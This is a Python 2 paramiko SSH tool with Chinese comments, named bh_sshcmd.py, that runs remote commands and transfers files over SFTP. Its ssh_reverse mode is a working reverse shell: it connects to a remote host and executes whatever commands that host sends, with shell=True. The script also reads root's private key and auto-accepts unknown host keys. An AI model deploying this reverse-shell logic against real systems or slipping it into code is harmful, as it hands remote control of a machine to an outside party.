#!/usr/bin/python
#-*- coding:utf-8 -*-
#连接远程ssh服务器，执行命令
#上传下载文件
#反向连接本地执行命令

import paramiko
import sys
import getopt
import os
import subprocess

command = False
download = False
upload = False
reverse= False
port=22
user=''
passwd=''
target=''

key=paramiko.RSAKey.from_private_key_file('/root/.ssh/id_rsa')
#远程主机执行命令，返回结果
def ssh_command(client):
    #主循环执行命令
    while True:
        try:
            command=raw_input("command:")
            #也可使用client.get_transport().open_session，但执行命令后会关闭，可持续传输数据
            stdin, stdout, stderr = client.exec_command(command)
            #返回结果为unicode列表，需要进行编码
            response=''
            for line in stdout.readlines():
                response+=line.encode('utf-8')
            print(response)
        except KeyboardInterrupt:
            client.close()
            sys.exit(0)
#上传文件至SSH服务器
def ssh_upload(client):
    transport=client.get_transport()
    #开启传输文件服务
    sftp = paramiko.SFTPClient.from_transport(transport)
    #主循环执行命令
    while True:
        try:
            localpath= raw_input("localpath:")
            #输入文件路径
            remotepath=raw_input("remotepath:") or ('/root/%s'%os.path.split(localpath)[1])
            sftp.put(localpath,remotepath)
            print '------------------------------------------------------------------------------'
            print 'UPLOAD SUCCESS:'
            print '[finished]local:%s >>>>> remote %s'%(localpath,remotepath)
            print '------------------------------------------------------------------------------'
        except KeyboardInterrupt:
            client.close()
            sys.exit(0)
#下载文件
def ssh_download(client):
    transport=client.get_transport()
    sftp = paramiko.SFTPClient.from_transport(transport)
    #主循环执行命令
    while True:
        try:
            remotepath=raw_input("remotepath:")
            localpath= raw_input("localpath:") or ('/root/%s'%os.path.split(remotepath)[1])
            sftp.get(remotepath,localpath)
            print '------------------------------------------------------------------------------'
            print 'DOWNLOAD SUCCESS:'
            print '[finished]local:%s <<<<< remote %s'%(localpath,remotepath)
            print '------------------------------------------------------------------------------'
        except KeyboardInterrupt:
            client.close()
            sys.exit(0)
#反向连接SSH服务器，可执行服务器输入的命令，返回结果
def ssh_reverse(client):
    transport=client.get_transport()
    chan=transport.open_session()
    chan.send('[+]Connected')
    command=chan.recv(1024)
    while True:
        try:
            command=chan.recv(1024)
            if command == 'exit':
                print '[EXIT] session finished '
                chan.close()
                client.close()
                sys.exit(0)

            print '[+] execute command: %s'% command
            cmd_output= subprocess.check_output(command,shell=True)
            chan.send(cmd_output)
        except:
            chan.close()
            client.close()
            sys.exit(0)

#连接SSH服务器，返回连接对象
def ssh_client(target,port,user,passwd):
    #初始化ssh客户端
    client=paramiko.SSHClient()
    #加载密钥
    client.load_host_keys('/root/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        #如果提供帐号密码
        if len(user)>2 and len(passwd)>2:
            client.connect(target,port,username=user,password=passwd)
        else:
            #密钥连接
            client.connect(target,port,pkey=key)
        return client
    except:
        print('connect failed!')
        sys.exit(0)

#用法
def usage():
    print "ssh client"
    print
    print "Usage: bh_sshcmd.py -t ip [option]"
    print "-t --target               - remote ip"
    print "-c --command               - command shell"
    print "-u --upload    - upon receiving connection upload a file and write to [destination]"
    print "--user=****    - if you don't want to use rsa"
    print "--passwd=****    - if you don't want to use rsa"
    print
    print
    print "Examples: "
    print "bh_sshcmd.py -t 192.168.0.1 -c"
    print "bh_sshcmd.py -t 192.168.0.1 -u --user=**** --passwd=****"
    sys.exit(0)

#主函数，获得参数
def main():
    global command
    global download
    global upload
    global user
    global passwd
    global target
    global port
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hdcurt:p:",
            ["help", "download", "command", "upload","reverse","user=","passwd=","target=","port="])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-d", "--download"):
            download = True
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload = True
        elif o in ("-r", "--reverse"):
            reverse = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o == "--user":
            user = a
        elif o == "--passwd":
            passwd = a
        else:
            assert False, "Unhandled Option"

    client=ssh_client(target,port,user,passwd)
    if command:
        ssh_command(client)
    elif upload:
        ssh_upload(client)
    elif download:
        ssh_download(client)
    elif reverse:
        ssh_reverse(client)
main()
